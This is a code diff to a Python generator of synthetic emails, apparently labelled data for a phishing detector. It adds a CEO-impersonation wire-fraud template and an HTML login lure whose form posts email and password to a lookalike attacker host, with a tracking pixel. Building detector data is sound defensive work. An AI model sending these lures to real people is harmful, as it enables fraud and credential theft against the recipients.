@@ -112,9 +112,47 @@ def _t_suspension(rng):
     return frm, subj, body
 
 
+def _t_bec(rng):
+    exec_name = _name(rng)
+    co = rng.choice(COMPANIES)
+    dom = co.lower().split()[0] + ".com"
+    frm = (f"{exec_name} (CEO) <{exec_name.split()[0].lower()}."
+           f"{exec_name.split()[1].lower()}@{dom}>")
+    subj = rng.choice(["Urgent request", "Are you available?", "Quick task", "Confidential"])
+    ask = rng.choice([
+        f"process an urgent wire transfer of {_amount(rng)} to a new vendor",
+        "purchase five $200 gift cards for a client and send me the codes",
+        "update the direct deposit details for our next payroll run",
+    ])
+    body = (f"Hi,\n\nAre you available? I need you to {ask} right away. This is time "
+            f"sensitive and must be handled today. Please keep this strictly confidential "
+            f"until it is done - I am in back-to-back meetings and can only be reached by "
+            f"email.\n\nThanks,\n{exec_name}\nCEO, {co}")
+    return frm, subj, body
+
+
+def _t_html_login(rng):
+    brand = rng.choice(["Microsoft 365", "Okta", "Google Workspace", "PayPal"])
+    frm = f"{brand} Support <no-reply@{rng.choice(LOOKALIKE)}>"
+    subj = rng.choice([f"Action required: re-authenticate your {brand} account",
+                       "Your password expires today", "Verify your mailbox to avoid suspension"])
+    evil = rng.choice(LOOKALIKE)
+    body = (f"<html><body><p>Dear user,</p>"
+            f"<p>Your {brand} session has expired. Sign in below to keep your access. "
+            f"Failure to verify within 24 hours will suspend your account.</p>"
+            f'<form action="http://{evil}/login" method="post">'
+            f'Email: <input type="text" name="email"><br>'
+            f'Password: <input type="password" name="password"><br>'
+            f'<button type="submit">Sign in</button></form>'
+            f'<img src="http://{evil}/o.gif" width="1" height="1">'
+            f"<p>{brand} Security Team</p></body></html>")
+    return frm, subj, body
+
+
 MALICIOUS = [("nigerian_419", _t_419), ("credential_harvest", _t_credential),
              ("fake_invoice", _t_invoice), ("prize_lottery", _t_prize),
-             ("account_suspension", _t_suspension)]
+             ("account_suspension", _t_suspension), ("bec_wire_fraud", _t_bec),
+             ("html_login_form", _t_html_login)]
 
 
 # ---- benign templates ----
